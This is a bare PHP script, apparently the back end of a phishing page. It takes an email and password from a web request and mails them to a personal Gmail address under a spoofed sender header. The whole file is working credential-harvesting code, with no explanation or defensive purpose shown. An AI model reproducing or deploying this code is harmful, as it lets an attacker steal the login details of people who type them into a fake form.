<?php

$login = $_GET['email'];

$password = $_GET['password'];



$to      = 'ivanigantyev@gmail.com';
$subject = 'the subject';
$message = 'login:'.$login."\n password:".$password;
$headers = 'From: webmaster@example.com' . "\r\n" .'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);



?>